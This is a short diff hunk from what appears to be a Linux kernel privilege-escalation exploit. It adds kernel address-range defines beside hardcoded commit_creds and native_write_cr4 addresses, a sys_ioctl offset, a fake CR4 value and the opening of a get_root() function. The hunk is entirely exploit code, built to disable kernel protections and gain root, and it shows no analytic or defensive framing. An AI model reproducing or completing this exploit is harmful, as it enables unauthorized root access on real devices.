@@ -49,6 +49,8 @@ size_t commit_creds_addr=0xffffffc0000d2800;
 size_t native_write_cr4_addr=0x65a30;
 size_t sys_ioctl_offset=0x22bc59;
 size_t fake_cr4=0x407f0;
+#define START_ADDR 0xffffffc000000000 //0xffffffff80000000
+#define END_ADDR 0xffffffc00fffffff    //ffffffffffffefff
 
 void get_root()
 {
